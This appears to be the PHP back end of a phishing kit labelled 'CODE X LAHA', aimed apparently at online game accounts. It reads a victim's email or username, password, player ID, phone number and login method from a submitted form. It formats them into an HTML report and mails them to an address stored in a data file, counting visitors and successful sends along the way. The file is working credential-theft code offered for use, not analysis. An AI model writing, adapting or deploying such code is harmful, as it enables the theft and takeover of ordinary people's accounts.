<?php

	include 'system/setting.php';
	include 'more.php';
    $sessionRess = sessionRess();


	$email = $_POST['email'];
	$password = $_POST['password'];
	$playid = $_POST['playid'];
	$phone = $_POST['phone'];
	$level = $_POST['level'];
	$login = $_POST['login'];

    $topic = "$arpantek_code - $arpantek_flag | $arpantek_callcode | LEVEL $level | $email | $login";

    $message = '

    <center> 
        <div border="1" style="border-collapse: collapse; border: 1px solid black; background: url('.$banner.') no-repeat center center; background-size: 100% 100%; width: 294; height: 200px; color: #000; text-align: center;"></div>
        <div style="border-collapse: collapse; border-color: white; background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Account Information | Sent : '.$codexlaha.'</div>
        <table style="border-collapse: collapse; border-color: black; background: #fff" width="100%" border="1">
            <tr>
                <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>EMAIL/USERNAME</th>
                <th style="width: 60%; text-align: center;"><b>'.$email.'</th> 
            </tr>
            <tr>
                <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>PASSWORD</th>
                <th style="width: 60%; text-align: center;"><b>'.$password.'</th> 
            </tr>
            <tr>
                <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>ID PLAYER</th>
                <th style="width: 60%; text-align: center;"><b>'.$playid.'</th> 
            </tr>
            <tr>
                <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>PHONE NUMBER</th>
                <th style="width: 60%; text-align: center;"><b>'.$phone.'</th> 
            </tr>
            <tr>
                <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>LEVEL ACCOUNT</th>
                <th style="width: 60%; text-align: center;"><b>'.$level.'</th> 
            </tr>
            <tr>
                <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>LOGIN WITH</th>
                <th style="width: 60%; text-align: center;"><b>'.$login.'</th> 
            </tr>
        </table>
        <div style="border-collapse: collapse; border-color: white; background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">More Information</div>
        '.$more.'
        <br />
        <table style="border-collapse: collapse; border-color: black; background: #fff; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px;" width="100%" border="1">
            <tr>
                <th style="width: 100%; text-align: center; font-size: 30px;" height="25px"><b>'.$arpantek_code.' '.$arpantek_flag.' '.$arpantek_country.'</th>
            </tr>
            <tr>
                <th style="padding-left: 10px; width: 100%; text-align: center; font-size: 13px;" height="25px"><b>© 2018-'.$yearNow.' CODE X LAHA All Right Reserved</th>
            </tr>
        </table>
    </center>
    <br />
    <b style="font-size:13px;">Session : '.$sessionRess.'</b>
    
    ';

    // TODAY
$Tget = file_get_contents("codexlaha/visitor.json");
$Tdecode = json_decode($Tget,true);
$today = $Tdecode['today'] + 1;
$Tdecode['today'] = $today;
$Tresult = json_encode($Tdecode);
            $Tfile = fopen('codexlaha/visitor.json','w');
                     fwrite($Tfile,$Tresult);
                     fclose($Tfile);
                     
// YESTERDAY
if(date("H:i") == "01:00"){
$Yget = file_get_contents("codexlaha/visitor.json");
$Ydecode = json_decode($Yget,true);
$Ydecode['yesterday'] = $Ydecode['today'];
$Ydecode['today'] = 0;
$Yresult = json_encode($Ydecode);
            $Yfile = fopen('codexlaha/visitor.json','w');
                     fwrite($Yfile,$Yresult);
                     fclose($Yfile);
}

// ALL OVER
$Aget = file_get_contents("codexlaha/visitor.json");
$Adecode = json_decode($Aget,true);
$all = $Adecode['total'] + 1;
$Adecode['total'] = $all;
$Aresult = json_encode($Adecode);
            $Afile = fopen('codexlaha/visitor.json','w');
                     fwrite($Afile,$Aresult);
                     fclose($Afile);

// RESULT DATA
$resultGet = file_get_contents("codexlaha/data.json");
$resultData = json_decode($resultGet,true);

$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From: '.$resultData['nama'].' <admin@arpanrizki.my.id>' . "\r\n";

if(mail($resultData['email'], $topic, $message, $headers))
{
$upGet = file_get_contents("codexlaha/data.json");
$upData = json_decode($upGet,true);
$hasil = $upData['totals'] + 1;
$upData['totals'] = $hasil;
$upResult = json_encode($upData);
$upFile = fopen('codexlaha/data.json','w');
          fwrite($upFile,$upResult);
          fclose($upFile);
}
